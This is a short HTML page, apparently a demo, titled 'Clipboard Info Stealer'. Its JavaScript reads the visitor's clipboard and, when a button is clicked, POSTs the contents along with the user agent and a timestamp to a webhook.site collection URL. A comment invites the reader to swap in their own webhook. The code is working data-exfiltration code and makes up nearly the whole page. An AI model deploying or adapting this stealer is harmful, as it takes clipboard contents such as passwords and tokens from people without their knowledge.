<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Clipboard Info Stealer Demo (Chrome Test)</title>
</head>
<body>
  <h1>🚨 Clipboard Info Stealer (Chrome Test)</h1>
  <button onclick="stealClipboard()">Steal Clipboard & POST</button>
  <pre id="output"></pre>

  <script>
    async function stealClipboard() {
      const output = document.getElementById("output");

      try {
        const data = await navigator.clipboard.readText();
        output.textContent = "📋 Clipboard:\n" + data;

        const payload = {
          stolenData: data,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString()
        };

        // 🔁 ⛔ Replace the URL below with your actual Webhook.site URL
        const webhookURL = "https://webhook.site/e9fe751d-ca09-45fb-bdd5-6742ffe0f4d7";

        const response = await fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });

        output.textContent += `\n\n✅ POST Sent! Status: ${response.status}`;
      } catch (err) {
        output.textContent += `\n\n❌ Error: ${err}`;
        console.error("Fetch Error:", err);
      }
    }
  </script>
</body>
</html>
